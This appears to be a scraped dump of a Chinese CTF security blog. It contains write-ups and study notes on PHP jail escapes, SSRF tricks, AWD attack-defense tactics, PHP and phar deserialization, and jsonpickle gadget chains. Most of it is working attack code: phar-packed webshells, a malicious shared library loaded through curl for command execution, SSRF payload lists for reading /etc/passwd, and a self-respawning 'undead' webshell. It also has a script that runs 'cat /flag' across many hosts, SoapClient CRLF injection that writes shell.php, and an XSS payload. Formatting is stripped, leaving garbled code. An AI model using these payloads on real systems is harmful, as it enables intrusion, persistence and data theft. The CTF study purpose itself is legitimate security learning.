a:2:s:1:a;O:4:User:2:s:8:username;s:5:admin;s:5:value;s:117:O:6:Access:2:s:9:*prefix;s:45:php://filter/convert.base64-encode/resource=/;s:9:*suffix;s:8:/../flag;;s:1:b;N;改为a:2:s:1:a;O:4:User:2:s:8:username;s:5:admin;s:5:value;s:117:O:6:access:2:s:9:*prefix;s:45:php://filter/convert.base64-encode/resource=/;s:9:*suffix;s:8:/../flag;;s:1:User;N; urlencode即可 php_jail_is_my_cry?phpif (isset($_POST[url])) $url = $_POST[url]; $file_name = basename($url); $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if ($data) file_put_contents(/tmp/.$file_name, $data); echo 文件已下载: a href=?down=$file_name$file_name/a; else echo 下载失败。; if (isset($_GET[down])) include /tmp/ . basename($_GET[down]); exit;// 上传文件if (isset($_FILES[file])) $target_dir = /tmp/; $target_file = $target_dir . basename($_FILES[file][name]); $orig = $_FILES[file][tmp_name]; $ch = curl_init(file://. $orig); // I hide a trick to bypass open_basedir, Im sure you can find it. curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if (stripos($data, ?) === false stripos($data, php) === false stripos($data, halt) === false) file_put_contents($target_file, $data); else echo 存在 `?` 或者 `php` 或者 `halt` 恶意字符!; $data = null; ? 简单的php代码 三个点下载文件 包含文件 上传文件 很明显的不准上传一句话php木马 这里有文件包含很容易联想到使用gz打包的pahr文件来绕过 include可以直接解析gz文件 写一句话木马 https://xz.aliyun.com/news/18584 ?php$phar = new Phar(12.phar);$phar -startBuffering();$stub = STUB?phpfile_put_contents(/var/www/html/.php,?=eval($_POST[1])?);__HALT_COMPILER();? STUB;$phar -setStub($stub);$phar -addFromString(test.txt, test);$phar -stopBuffering();? 生成的phar文件打包成gz gzip 12.phar 源码phpini或者这里的环境都给了disablefunctions 几乎把所有禁完了 提示 ​ I hide a trick to bypass open_basedir, I’m sure you can find it. open_basedir/var/www/html:/tmp/var/www/html:/tmp 使用curl来进行命令rce 该curl命令行工具在类 POSIX 系统（Linux、macOS 等）上存在任意代码执行漏洞。该--engine选项允许从共享库（文件）加载 OpenSSL 加密引擎.so。关键在于，该选项接受库文件的绝对路径或相对路径，从而允许用户加载文件系统上的任何共享库。攻击者可以构造一个包含__attribute__((constructor))函数的恶意共享库。该函数会在库加载到进程内存时由动态加载器执行curl，从而实现立即代码执行，甚至在 OpenSSL 尝试将其初始化为引擎之前。如果攻击者可以影响传递给命令的参数curl，这将导致直接 RCE，这是 Web 应用程序后端、CI/CD 管道和其他自动化脚本中的常见情况。 https://hackerone.com/reports/3293801 通过编译一个.so文件进行读取realflag文件 #include stdlib.h__attribute__((constructor))static void rce_init(void) system(/readflag ./flag.txt); 上传so文件成功后回到原来的木马界面 1=$ch = curl_init(http://www.azureyinglong.cn);curl_setopt($ch, CURLOPT_SSLENGINE , /tmp/sauy.so);$data = curl_exec($ch);curl_close($ch); 访问flag.txt拿到flag 我曾有一份工作​","tags":["CTF-wp"]},{"title":"SSRF技巧总结","path":"/2025/08/04/SSRF技巧总结/","content":"·以下 3 种主要方式在 PHP 中检索 URLcurl library (CURL库)用于发起网络请求（HTTP、HTTPS、FTP 等) 可以设置 复杂请求头 GET/POST/PUT 可以支持复杂协议 HTTP/HTTPS/FTP/SMTP file_get_contents (函数)支持 http://、https:// 等 URL（前提是 PHP allow_url_fopen = On） 支持读取敏感本地文件 file_get_contents(file:///etc/passwd); exec()exec(ping . $_GET[ip]); ·容易受攻击的代码situation-1-filter_var()filter_var()PHP 提供的一个函数，用来过滤和验证变量。 filter_var($value, $filter, $options); FILTER_VALIDATE_URLPHP 预定义的过滤器之一 用法:filter_var(‘http://example.com‘, FILTER_VALIDATE_URL); 作用：用来检查字符串是否是一个合法的 URL FILTER_FLAG_QUERY_REQUIRED·类型：PHP 内置过滤器的 标志（flag）。 ·用途：与 FILTER_VALIDATE_URL 搭配使用，要求 URL 必须包含查询字符串。 $url = http://example.com;$result = filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);var_dump($result); // false，因为没有查询字符串$url = http://example.com/?id=1;$result = filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);var_dump($result); // string(26) http://example.com/?id=1 攻击面?phpfunction curl($url) $optArray = array( CURLOPT_URL = $url, CURLOPT_FOLLOWLOCATION = 1 ); $ch = curl_init(); curl_setopt_array($ch, $optArray); $response = curl_exec($ch) or die(Error!); curl_close($ch); return $response;$content = curl(filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED));echo $content; 攻击方法: file:/etc/passwd?/ file:/etc%252Fpasswd?/ 读取flagfile:/flag? situation-2- file_get_contents()?php$f = filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED) or die(Error!);echo file_get_contents($f); POC: file:///etc/?/../passwd 解释:将其用作目录文件夹名称时，“?” 的使用使其通过验证。然后，我们需要使用“..”技巧来返回到“etc”。 读取flag file:///etc/?/../../flag situation-3?php$url = filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);exec(curl -L . $url, $content) or die(Error!);print_r($content); POC： file:/etc/passwd?/ file:$br/et$uc/pas$teswd?/ 读取flag也是一样的: file:/flag?/ file:$br/fl$teag?/ 解释:因为$x（其中x可以是任何常规字符或字符串）在 Bash 中用于替换变量，该变量必须不存在，否则会在执行的命令中被丢弃。$(x)也可以使用。 汇总pocfile:/etc/passwd?/file:/etc/passwd%3F/file:/etc%252Fpasswd/file:/etc%252Fpasswd%3F/file:///etc/?/../passwdfile:///etc/%3F/../passwdfile:$br/et$uc/pas$teswd?/file:$(br)/et$(u)c/pas$(te)swd?/file:$br/et$uc%252Fpas$teswd?/file:$(br)/et$(u)c%252Fpas$(te)swd?/file:$br/et$uc%252Fpas$teswd%3F/file:$(br)/et$(u)c%252Fpas$(te)swd%3F/file:///etc/passwd?/../passwd","tags":["CTF学习"]},{"title":"AWD笔记","path":"/2025/08/03/AWD记录/","content":"AWD记录改linux密码passwd 输入新密码即可 有权限删除用户userdel -r [用户名] 改mysql密码update mysql.user set passwordpassword(‘密码’) where user’root’; 1. 登录 mysql 终端，运行：mysql set password=password(new password);mysqlflush privileges;2. 修改 mysql user 表mysqluse mysql;mysqlupdate user set password=password(new password) where user=root;mysqlflush privileges;3. 使用 GRANT 语句mysqlGRANT ALL PRIVILEGES ON *.* TO root@127.0.0.1 IDENTIFIED BY new password WITH GRANT OPTION;mysqlflush privileges;4. mysqladmin[root@ubuntu]# mysqladmin -u root password new password;（注意双引号或不加） 删除匿名用户delete from mysql.user where user’ ‘; 刷新配置flush privileges; 改网站后台密码从网站页面或者源码或者御剑工具找到后台页面，然后尝试弱口令登入后改管理员密码。 网站目录打包成cd varwwwhtml tar -cvf [打包后的文件名.tar] * zip -r 输出文件名.zip 目录名 将压缩包解压，然后拉到D盾里面扫描木马文件 查看最近修改的文件ls -ltR | head -n 10 查看进程who 杀死进程pkill -kill -t pts进程号 ffuf扫描存活的端口ffud -u url.FUZZ.url number.txt 登录mysql1.navicat mysql默认端口3306 可能不允许外部连接 2.服务器里登录 mysql -u [username] -p 不死马sauy.php ?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = ./index.php;$code = ?php if(md5($_POST[pass])==02db7748bedfcd5dafc502d63228f455)@eval($_POST[a]); ?;while (1)\tfile_put_contents($file,$code);\tusleep(5000);//hacked by sauy? passRimuru20250802 马儿用法：fuckyou.php?passRimuru20250802acommand 杀不死马杀死不死马的方法，查看不死马的进程ID： # top | grep httpd chmod 777 kill.sh nohup .kill.sh 查到ID为 11198 ，根据ID号和webshell名写.sh脚本。 # vim kill.sh #!/bin/bashwhile truedo kill -9 11198 2/dev/null rm -f .shell.phpdone 调取自己的webshell不断交flagimport requeststoken = nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]targets = [fhttp://192-168-1-i.pvp6258.bugku.cn/.sauy.php for i in nums]for url in targets: try: print(f[+] Checking url) resp = requests.post(url, data=cmd: cat /flag, timeout=3) flag = resp.text.strip() if flag in flag: # 简单判断 print(f[+] Got flag from url: flag) submit_url = fhttps://ctf.bugku.com/pvp/submit.html?token=tokenflag=flag r = requests.get(submit_url) print(f[+] Submit response: r.text) else: print(f[-] No flag at url) except requests.RequestException as e: print(f[-] url Failed: e) ffuf扫描存活网口ffuf -u http://192-168-1-FUZZ.pvp6258.bugku.cn -w number.txt -mc 200,403","tags":["AWD"]},{"title":"PHP反序列化总结","path":"/2025/08/01/php反序列化总结/","content":"必知知识protected 和 privateprivate:变量名前加”%00[类名]%00” ?phpclass test private $pub=benben; function jineng() echo $this-pub; $a = new test();echo serialize($a);?O:4:test:1:s:9:testpub;s:6:benben; protected:变量名前加”%00*%00” ?phpclass test protected $pub=benben; function jineng() echo $this-pub; $a = new test();echo serialize($a);?O:4:test:1:s:6:*pub;s:6:benben; 魔术方法__construct() //当对象被创建时，会触发进行初始化__destruct() //对象被销毁时触发__sleep() //serialize()函数会先检查类是否存在有一个魔术方法__sleep()。如果存在，该方法会被先调用，然后再执行序列化操作。__wakeup() //unserialize之前会检查是否存在一个__wakeup函数 如果存在 就会先调用这个方法 然后再反序列化 //执行之前__toString()： //当一个对象被当作字符串使用时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试以调用函数的方式调用一个对象时 绕过__wakeup()当成员属性数目大于实际数目O:4:Name:2:s:8:username;s:5:admin;s:8:password;i:100;改成O:4:Name:3:s:8:username;s:5:admin;s:8:password;i:100; 意思是把两个变量指向同一内存地址,这样当对其中一个变量进行操作时，另一个也会随之变化。不仅可以应用于绕过__wakeup(),其实更常用在为了满足特定条件而使用。 EX:下题就利用了，但是实际执行了wakeup，只是通过的特性让其满足if的条件。 ?phphighlight_file(__FILE__);class ctf public $key; public function __destruct() echo destructbr; $this-key=False; if(!isset($this-wakeup)||!$this-wakeup) echo You get it!; public function __wakeup() echo wakeupbr; $this-wakeup=True; unserialize($_GET[ctf]);/**$a = new ctf();$a-key = $a-wakeup;echo serialize($a);序列化数据:O:3:ctf:2:s:3:key;N;s:6:wakeup;R:2;**/ 使用C绕过序列化数据把第一个O改成C即可，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，不过可以使用原生类打包的方式来绕过，也是绕过^[Oa]:[d]+过滤的方法之一。 [LitCTF 2025]君の名は就考了绕过^[Oa]:[d]+过滤，使用原生类打包。 以C开头的原生类 [如果要使用原生类打包的话，运行链子建议在较低版本运行，我使用的是5.xx,因为高版本php序列化出来的数据不是C开头，而是O] ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize PHP GC回收机制GC的全称是Garbage Collection也就是垃圾回收的意思在PHP中，是使用引用计数和回收周期来自动管理内存对象的，当一个对象被设置为NULL，或者没有任何指针指向时，他就会变成垃圾，被GC机制回收掉，这里其实就可以理解为当一个对象没有被引用时，也就是基本类型(字符串，整形等等），被引用也就是一个对象(Object），在这可以理解为一个对象没有被引用时就会被GC机制回收 当我们PHP创建一个变量时，这个变量会被存储在一个名为zval的变量容器中。在这个zval变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。 第一个字节名为is_ref，是bool值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。 第二个字节是refcount，它用来表示指向zval变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用。 ?php$a=Sauy;xdebug_debug_zval(a);? 输出: a:(refcount=1, is_ref=0)string Sauy (length=4) 有一个变量a,且未被引用故为false 变量容器在refcount变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,refcount就会减1。 php反序列化的引用GC如果在PHP反序列化中生效，那它就会直接触发_destruct方法 unset处理的情况?phphighlight_file(__FILE__);error_reporting(0);class test public $num; public function __construct($num) $this-num = $num; echo $this-num.__construct./br; public function __destruct() echo $this-num.__destruct()./br; $a = new test(1);$b = new test(2);$c = new test(3);/*1__construct2__construct3__construct3__destruct()2__destruct()1__destruct()*/ 但是当我我们加上unset时 ?phphighlight_file(__FILE__);error_reporting(0);class test public $num; public function __construct($num) $this-num = $num; echo $this-num.__construct./br; public function __destruct() echo $this-num.__destruct()./br; $a = new test(1);unset($a);$b = new test(2);$c = new test(3);/*1__construct1__destruct()2__construct3__construct3__destruct()2__destruct()*/ 发现destruct被提前触发 当对象为**NULL**时?phphighlight_file(__FILE__);$flag = flagtest_flag;class B function __destruct() global $flag; echo $flag; $a = unserialize($_GET[ctf]);throw new Exception(nonono); 这段代码正常情况下因为抛出异常无法触发destruct，这个时候就需要gc机制来触发 ?phphighlight_file(__FILE__);class B function __destruct() global $flag; echo $flag; $a=array(a=new B,b=NULL);echo serialize($a);//a:2:s:1:a;O:1:B:0:s:1:b;N; 把b改为a就可以绕过 即在反序列化时，会下先让a赋值为类B，之后再将a赋值为NULL，但一开始a已经是对象了，赋值为NULL时就会出现对象为NULL的情况，从而触发__destruct a:2:{s:1:”a”;O:1:”B”:0:{}s:1:”a”;N;} 这种方法也是php序列化常用的trick phar序列化的应用方法类似于php反序列化 不过phar文件是需要签名 生成了一般的phar文件不能010直接改需要脚本改 例题:prize_p1 | NSSCTF wp:[关于gc回收机制在phar序列化的一次例题](https://sauy.top/2025/07/22/NSSCTF prize_p1) 字符串逃逸原理Q：为何要进行字符串逃逸？ 当我们通过pop或者其他方式不可以修改目标的值时，可以通过控制可控变量来进行修改目标的值，从而达成攻击。 ?phpfunction waf($str) return str_replace(bad,good,$str);class GetFlag public $key; public $cmd = whoami; public function __construct($key) $this-key = $key; public function __destruct() system($this-cmd); unserialize(waf(serialize(new GetFlag($_GET[key])))); 如果本题我们传入keybadbad： O:7:GetFlag:2:s:3:key;s:6:badbad;s:3:cmd;s:6:whoami; 但是由于str_place 会将bad替换为good，变为： O:7:GetFlag:2:s:3:key;s:6:goodgood;s:3:cmd;s:6:whoami; s:6:goodgood; 这样写是错误的 php只能解析到’goodgo‘ 多出的od就会被丢弃 但是这里由于传入格式错误 所以不可行 我们可以考虑用这种原理，来构造合法的字符串修改cmd的值。 我们想构造： O:7:GetFlag:2:s:3:key;s:N:N个长度的字符串;s:3:cmd;s:2:ls;;s:3:cmd;s:6:whoami;key=N个长度的字符串;s:3:cmd;s:2:ls;;s:3:cmd;s:2:ls; 就是我们想要逃逸出去的字符，我们希望N个长度的字符串的长度恰好到双引号之前，此时我们的输入就会作为合法的序列化数据进行处理，后续原本的 “;s:3:”cmd”;s:6:”whoami”;} 就会被丢弃。 我们需要插入的字符总共有22位，因此需要逃逸出22个字符，一个bad可以逃逸出1个字符，因此需要22个bad，构造Exp如下： ?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad;s:3:cmd;s:2:ls;变为：O:7:GetFlag:2:s:3:key;s:88:goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood;s:3:cmd;s:2:ls;;s:3:cmd;s:6:whoami; 最后的”;s:3:”cmd”;s:6:”whoami”;}就会被抛弃 成功修改了cmd的值 最后要读flag我们需要构造 ;s:3:cmd;s:9:cat /flag; 一共29个 那么需要29个bad变为good ?keybadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad”;s:3:”cmd”;s:9:”cat flag”;} 字符串增多原理：通过闭合来修改我们想要修改属性的值 [NepCTF2024]PHP_MASTER!! 源码: ?phphighlight_file( __FILE__);error_reporting(0);function substrstr($data) $start = mb_strpos($data, [); $end = mb_strpos($data, ]); return mb_substr($data, $start + 1, $end - 1 - $start);class A public $key; public function readflag() if($this-key=== \\0key\\0) $a = $_POST[1]; $contents = file_get_contents($a); file_put_contents($a, $contents); class B public $b; public function __tostring() if(preg_match(/\\[|\\]/i, $_GET[nep])) die(NONONO!!!); $str = substrstr($_GET[nep1].[welcome to. $_GET[nep].CTF]); echo $str; if ($str===NepCTF]) return ($this-b) (); class C public $s; public $str; public function __construct($s) $this-s = $s; public function __destruct() echo $this -str; $ser = serialize(new C($_GET[c]));$data = str_ireplace(\\0,00,$ser);unserialize($data);O:1:C:2:s:1:s;s:1:a;s:3:str;O:1:B:1:s:1:b;N; s后面的部分：;s:3:str;O:1:B:1:s:1:b;N;这就是我们需要逃逸的部分，一个%00可以逃逸一个字符，而我们需要逃逸35个字符，就需要35个%00 c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;N; 这样就可以到B类的__tostring()方法了。 同样的，我们还需要让B类的$b变成phpinfo： “;s:3:”str”;O:1:”B”:1:{s:1:”b”;s:7:”phpinfo”;}} 一共47个字符，那么我们就需要47个%00 c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;s:7:phpinfo; 总payload： c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;s:7:phpinfo;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0nep=NepCTNep 字符串减少（较难）原理：是逃逸出一个新的属性 Phar反序列化PHAR是类似于java里的jar包 联系：文件包含里 phar伪协议可以直接读取.phar文件 漏洞原理：使用phar伪协议解析文件的时 ，会自动触发对manifest字段的序列化字符串进行反序列化 phar需要php5.2 其他的看题 ?phphighlight_file(__FILE__);error_reporting(0);class Testobj var $output=echo ok;; function __destruct() eval($this-output); if(isset($_GET[filename])) $filename=$_GET[filename]; var_dump(file_exists($filename));? 利用phar伪协议去读取.phar文件然后再进行执行命令 例题：[NSSRound#4 SWPU]1zweb php -d phar.readonly=0 D:\\ctf\\WEB\\test\\test.php查看index.php 和 upload.php 不难就是利用eval phar反序列化 主要讲payload1和paylaod2payload1:生成要被反序列化的phar文件?phpclass LoveNss public $ljt; public $dky; public $cmd; public function __construct() $this-ljt=Misc; $this-dky=Re; $this-cmd=system(cat /flag);; $phar = new Phar(sauy.phar);$phar-startBuffering();$phar-setStub(GIF89a.?php __HALT_COMPILER(); ? );$a = new LoveNss();$$phar-setMetadata($$a);$phar-addFromString(test.txt, test);$phar-stopBuffering();? payload2：主要是为了绕过wakeup函数 我们就需要修改成员属性 这里签名就会失效 所以需要重新签名 最重要的点就是签名算法要用sha256 而不是网上写的sha1import gzipfrom hashlib import sha256with open(sauy.phar, rb) as file: f = file.read()s = f[:-28] # 获取要签名的数据s = s.replace(b3:, b4:)#更换属性值，绕过__wakeuph = f[-8:] # 获取签名类型以及GBMB标识newf = s + sha256(s).digest() + h # 数据 + 签名 + (类型 + GBMB)#print(newf)newf = gzip.compress(newf) #对Phar文件进行gzip压缩with open(sauy122.png, wb) as file:#更改文件后缀 file.write(newf)//然后就是上传 sauy122.png文件 使用phar协议来读取文件达到phar反序列化的目的上传成功 post传入：file=phar://./upload/sauy122.png 原生类C开头ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize 绕MD5SHA1 XSS使用ErrorException内置类 这两个类使用方法一样的 适用于php7版本在开启报错的情况下（这个默认都是开启的） Error中也有个__toString()，可以控制它的内容实现字符串的输出。 XSS?phphighlight_file(__FILE__);echo unserialize($_GET[ctf])O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A34%3A%22%3Cscript%3Ealert%28%27xss+test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A27%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Caaa.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D MD5SHA1 会以字符串的形式输出当前的错误信息，包含当前的错误信息（”payload”）还有当前报错的行号（”2”） 那么如果两个同样的类在同一行，那么它的返回值一定是一样的，只要咱们传递的第二个参数不同的话，就可以实现绕过了。 ?php$a = new Error(null, 1);$b = new Error(null, 2);echo $a.br.$b;? 输出 Error: null in D:\\phpstudy_pro\\WWW\\aaa.php:2 Stack trace: #0 mainError: null in D:\\phpstudy_pro\\WWW\\aaa.php:2 Stack trace: #0 main [2020 Geek Challenge GreatPHP] ?phperror_reporting(0);class SYCLOVER public $syc; public $lover; public function __wakeup() if( ($this-syc != $this-lover) (md5($this-syc) === md5($this-lover)) (sha1($this-syc)=== sha1($this-lover)) ) if(!preg_match(/\\\\?php|\\(|\\)|\\|\\/, $this-syc, $match)) eval($this-syc); else die(Try Hard !!); if (isset($_GET[great])) unserialize($_GET[great]); else highlight_file(__FILE__);??phpclass SYCLOVER public $syc; public $lover; public function __wakeup() if( ($this-syc != $this-lover) (md5($this-syc) === md5($this-lover)) (sha1($this-syc)=== sha1($this-lover)) ) if(!preg_match(/\\\\?php|\\(|\\)|\\|\\/, $this-syc, $match)) eval($this-syc); else die(Try Hard !!); $str = ??=include~.urldecode(%D0%99%93%9E%98).?;/*或使用[~(取反)][!%FF]的形式，即: $str = ??=include[~.urldecode(%D0%99%93%9E%98).][!.urldecode(%FF).]?; $str = ??=include $_GET[_]?;*/$a=new Exception($str,1);$b=new Exception($str,2);$c = new SYCLOVER();$c-syc = $a;$c-lover = $b;echo(urlencode(serialize($c)));? 文件操作遍历文件DirectoryIterator FilesystemIterator GlobIterator 配合glob:遍历文件,可以搭配伪协议使用。 DirectoryIterator与glob:协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件 读文件SplFileObject类 ?php$context = new SplFileObject(/etc/passwd);foreach($context as $f) echo($f); SSRFSoapClient 类 该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。 构造函数为: public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) ·第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。 ·第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。 使用前提:1.需要有soap扩展，且不是默认开启，需要手动开启2.需要调用一个不存在的方法触发其__call()函数3.仅限于http/https协议 使用示例:?php$a = new SoapClient(null,array(location=http://47.xxx.xxx.72:2333/aaa, uri=http://47.xxx.xxx.72:2333));$b = serialize($a);echo $b;$c = unserialize($b);$c-a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf? SSRF + CRLF 配合使用SoapClient反序列化+CRLF 可以生成任意POST请求 EX1： ?php$target = http://47.xxx.xxx.72:2333/;$post_data = data=whoami;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93);$a = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: . (string)strlen($post_data).^^^^.$post_data,uri=test));$b = serialize($a);$b = str_replace(^^, \\r,$b);echo $b;$c = unserialize($b);$c-a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf? EX2： ?php$target = http://127.0.0.1/flag.php;// 填入post的数据 $post_string = a=file_put_contents(shell.php, ?php phpinfo();?);;// 填入你想要的http头$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: aaaa=ssss);$user_agent = aaa^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string;$options = array( location = $target, user_agent= $user_agent, uri= aaab);$b = new SoapClient(null, $options);$aaa = serialize($b);$aaa = str_replace(^^, %0d%0a, $aaa);$aaa = str_replace(, %26, $aaa);echo $aaa;? XXESimpleXMLElement类 可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程 xml 文件的载入。第二个参数的常量值我们设置为 2 即可。第一个参数 data 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url。 这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。 [SUCTF 2018]Homework Trick过滤属性名称用大写的S后跟的名称，php会当成16进制解析 O:9:catalogue:2:s:5:class;s:13:SplFileObject;s:4:data;s:5:/flag;O:9:catalogue:2:s:5:class;S:13:SplFile\\4fbject;s:4:data;s:5:/flag;O:9:catalogue:2:s:5:class;S:13:SplFileOb\\6Aect;s:4:data;s:5:/flag;O:8:passthru:2:s:1:S;S:20:\\70\\61\\73\\73\\74\\68\\72\\75\\28\\22\\63\\61\\74\\20/\\66*\\22\\29;;s:3:dir;N; 过滤类名大小写绕过 类内方法调用静态: A::test();[A,test](); 动态: A::test();[A,test](); 部分参考链接(有一些记不到了) https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/https://xz.aliyun.com/news/11289","tags":["Study-Note"]},{"title":"NepCTF 2025","path":"/2025/07/29/NepCTF-WEB/","content":"JavaSeri基础的shiro反序列化 工具可以一把梭 dirsearch扫出来一个www.zip,有一堆东西，也有账密 sunxiaochuan258 NM$L@SBCNM.COM 密钥为kPH+bIxk5D2deZiIxcaaaA 解决 easyGooGooVVVY and RevengeGooGooVVVY通用poc 出题人waf没换说是 this.class.classLoader.loadClass(java.lang.Runtime) .getRuntime() .exec(env) .inputStream .text safe_bank前言:这道题很考验python代码审计的能力 需要我们自己去读源码 还有一些小小的坑点 进入题目有 和一个注册框 先注册帐号进去看看 提示我需要管理权限 authzeyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogInNhdXkiLCAidHMiOiAxNzUzNzkwNDM5fX0 解码得 py/object: __main__.Session, meta: user: sauy, ts: 1753790439 那我直接user改为admin 哇！是管理员面板!难道我win了吗 进去是假的flag(笑嘻了) 既然是jsonpickle 有jsonpickle反序列化这个知识点 这里我在赛中使用了很多poc 但是因为一些原因都没办法成功打通(悲) 但是知道一点waf builtins subclasses reduce system subprocess state re code os reduce import __class__ open不行 后复现参考了文章https://xz.aliyun.com/news/16133 注重看pyobject 看到 py/object: glob.glob, py/newargs: /* 没有blacklist里的 直接用这个回显error 题里面authz的结构是 py/object: __main__.Session, meta: user: sauy, ts: 1753790439 那应该是必须符合这个结构 把链子放在user处 py/object: __main__.Session, meta: user: py/object: glob.glob, py/newargs: /*, ts: 1753790439 还是回显error 正确的poc是 py/object: __main__.Session, meta: user: py/object: glob.glob, py/newargsex: [py/set:[/*],],ts:1753790439 解释： 1.使用pynewargsex py/newargs是给实现了__new__的对象用的py/newargsex是给没实现__new__的old-style class用的 2.使用set方式传 保证args, kwargs = obj[tags.NEWARGSEX]在运行时不会出错 3.json要全部都是双引号 所以这题我认为门槛挺高的,对没有过开发经验的人来说不太友好，很有国外xss的味道了(仅个人观点) 但是最后解出是40多 师傅们很强 期待看到其他师傅的解法 言归正传 使用上述正确poc后 要读readflag 读文件 py/object: linecache.getlines, py/newargs: [/flag] 读源码 py/object: __main__.Session, meta: user: py/object: linecache.getlines, py/newargsex: [py/set:[/app/app.py],],ts:1753790439 格式化后的源码 from flask import Flask, request, make_response, render_template, redirect, url_forimport jsonpickleimport base64import jsonimport osimport time# --- Flask 应用初始化 ---app = Flask(__name__)app.secret_key = os.urandom(24) # 用于会话和CSRF保护的秘钥# --- 用户账户和会话类定义 ---class Account: def __init__(self, uid, pwd): self.uid = uid self.pwd = pwdclass Session: def __init__(self, meta): self.meta = meta# --- 用户数据库（硬编码）---users_db = [ Account(admin, os.urandom(16).hex()), # 管理员账户，密码随机生成 Account(guest, guest) # 普通用户账户]# --- 用户注册辅助函数 ---def register_user(username, password): 尝试注册新用户。 如果用户名已存在，返回 False。 for acc in users_db: if acc.uid == username: return False users_db.append(Account(username, password)) return True# --- WAF 黑名单列表 ---# 包含大量用于阻止反序列化攻击的关键词FORBIDDEN = [ builtins, os, system, repr, __class__, subprocess, popen, Popen, nt, code, reduce, compile, command, pty, platform, pdb, pickle, marshal, socket, threading, multiprocessing, signal, traceback, inspect, \\\\\\\\, posix, render_template, jsonpickle, cgi, execfile, importlib, sys, shutil, state, import, ctypes, timeit, input, open, codecs, base64, jinja2, re, json, file, write, read, globals, locals, getattr, setattr, delattr, uuid, __import__, __globals__, __code__, __closure__, 